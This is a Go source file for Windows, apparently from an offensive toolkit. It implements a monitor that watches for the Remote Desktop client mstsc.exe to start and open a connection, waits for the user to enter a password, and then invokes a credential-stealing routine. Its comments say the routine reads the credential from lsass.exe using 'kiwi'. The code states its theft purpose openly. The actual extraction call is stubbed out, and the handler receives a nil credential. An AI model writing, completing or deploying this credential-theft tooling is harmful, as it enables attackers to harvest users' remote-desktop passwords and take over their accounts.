// +build windows

package kiwimon

import (
	"context"
	"sync"
	"time"

	"github.com/pkg/errors"

	"project/internal/logger"
	"project/internal/module/netstat"
	"project/internal/module/netstat/netmon"
	"project/internal/module/process"
	"project/internal/module/process/psmon"
	"project/internal/module/windows/api"
	"project/internal/module/windows/kiwi"
	"project/internal/nettool"
	"project/internal/xpanic"
	"project/internal/xsync"
)

// DefaultStealWaitTime is the wait time to steal password that find mstsc.exe
// process and establish connection.
const DefaultStealWaitTime = 15 * time.Second

// Handler is used to receive stolen credential.
type Handler func(local, remote string, pid int64, cred *kiwi.Credential)

// Monitor is used to watch password mstsc from, if mstsc.exe is created and
// establish connection, then wait some second for wait user input password,
// finally, use kiwi to steal password from lsass.exe
type Monitor struct {
	logger        logger.Logger
	handler       Handler
	stealWaitTime time.Duration

	psmon  *psmon.Monitor
	netmon *netmon.Monitor

	// key is PID
	watchPIDList    map[int64]struct{}
	watchPIDListRWM sync.RWMutex

	mu sync.Mutex

	ctx     context.Context
	cancel  context.CancelFunc
	counter xsync.Counter
}

// Options contains options about monitor.
type Options struct {
	ProcessMonitorInterval time.Duration
	ConnMonitorInterval    time.Duration
	StealWaitTime          time.Duration
}

// New is used to create a new kiwi monitor.
func New(logger logger.Logger, handler Handler, opts *Options) (*Monitor, error) {
	if opts == nil {
		opts = new(Options)
	}
	monitor := Monitor{
		logger:        logger,
		handler:       handler,
		stealWaitTime: opts.StealWaitTime,
		watchPIDList:  make(map[int64]struct{}),
	}
	if monitor.stealWaitTime == 0 {
		monitor.stealWaitTime = DefaultStealWaitTime
	}
	monitor.ctx, monitor.cancel = context.WithCancel(context.Background())
	// initialize process monitor
	psmonOpts := psmon.Options{
		Interval: opts.ProcessMonitorInterval,
		Process: &process.Options{
			GetSessionID:      true,
			GetUsername:       true,
			GetCommandLine:    true,
			GetExecutablePath: true,
			GetCreationDate:   true,
		},
	}
	processMonitor, err := psmon.New(logger, monitor.psmonHandler, &psmonOpts)
	if err != nil {
		return nil, errors.WithMessage(err, "failed to create process monitor")
	}
	// initialize connection monitor
	netmonOpts := netmon.Options{
		Interval: opts.ConnMonitorInterval,
		Netstat: &netstat.Options{
			TCPTableClass: api.TCPTableOwnerPIDAll,
			UDPTableClass: api.UDPTableOwnerPID,
		},
	}
	networkMonitor, err := netmon.New(logger, monitor.netmonHandler, &netmonOpts)
	if err != nil {
		_ = processMonitor.Close()
		return nil, errors.WithMessage(err, "failed to create network monitor")
	}
	// set struct fields
	monitor.psmon = processMonitor
	monitor.netmon = networkMonitor
	return &monitor, nil
}

func (mon *Monitor) log(lv logger.Level, log ...interface{}) {
	mon.logger.Println(lv, "kiwi monitor", log...)
}

func (mon *Monitor) psmonHandler(_ context.Context, event uint8, data interface{}) {
	switch event {
	case psmon.EventProcessCreated:
		mon.watchPIDListRWM.Lock()
		defer mon.watchPIDListRWM.Unlock()
		for _, ps := range data.([]*process.PsInfo) {
			if ps.Name == "mstsc.exe" {
				mon.watchPIDList[ps.PID] = struct{}{}
			}
		}
	case psmon.EventProcessTerminated:
		mon.watchPIDListRWM.Lock()
		defer mon.watchPIDListRWM.Unlock()
		for _, ps := range data.([]*process.PsInfo) {
			if ps.Name == "mstsc.exe" {
				delete(mon.watchPIDList, ps.PID)
			}
		}
	}
}

func (mon *Monitor) netmonHandler(_ context.Context, event uint8, data interface{}) {
	if event != netmon.EventConnCreated {
		return
	}
	mon.watchPIDListRWM.RLock()
	defer mon.watchPIDListRWM.RUnlock()
	for _, conn := range data.([]interface{}) {
		var (
			pid    int64
			local  string
			remote string
		)
		switch conn := conn.(type) {
		case *netstat.TCP4Conn:
			pid = conn.PID
			if _, ok := mon.watchPIDList[pid]; !ok {
				continue
			}
			local = nettool.JoinHostPort(conn.LocalAddr(), conn.LocalPort)
			remote = nettool.JoinHostPort(conn.RemoteAddr(), conn.RemotePort)
		case *netstat.TCP6Conn:
			pid = conn.PID
			if _, ok := mon.watchPIDList[pid]; !ok {
				continue
			}
			local = nettool.JoinHostPort(conn.LocalAddr(), conn.LocalPort)
			remote = nettool.JoinHostPort(conn.RemoteAddr(), conn.RemotePort)
		}
		if pid != 0 {
			mon.counter.Add(1)
			go mon.stealCredential(local, remote, pid)
		}
	}
}

func (mon *Monitor) stealCredential(local, remote string, pid int64) {
	defer mon.counter.Done()
	defer func() {
		if r := recover(); r != nil {
			mon.log(logger.Fatal, xpanic.Print(r, "Monitor.stealCredential"))
		}
	}()
	// wait user input password
	timer := time.NewTimer(mon.stealWaitTime)
	defer timer.Stop()
	select {
	case <-timer.C:
	case <-mon.ctx.Done():
		return
	}
	// steal credential

	mon.handler(local, remote, pid, nil)
}

// Close is used to close kiwi monitor.
func (mon *Monitor) Close() error {
	mon.cancel()
	mon.mu.Lock()
	defer mon.mu.Unlock()
	if mon.psmon != nil {
		err := mon.psmon.Close()
		if err != nil {
			return err
		}
		mon.psmon = nil
	}
	if mon.netmon != nil {
		err := mon.netmon.Close()
		if err != nil {
			return err
		}
		mon.netmon = nil
	}
	mon.counter.Wait()
	return nil
}
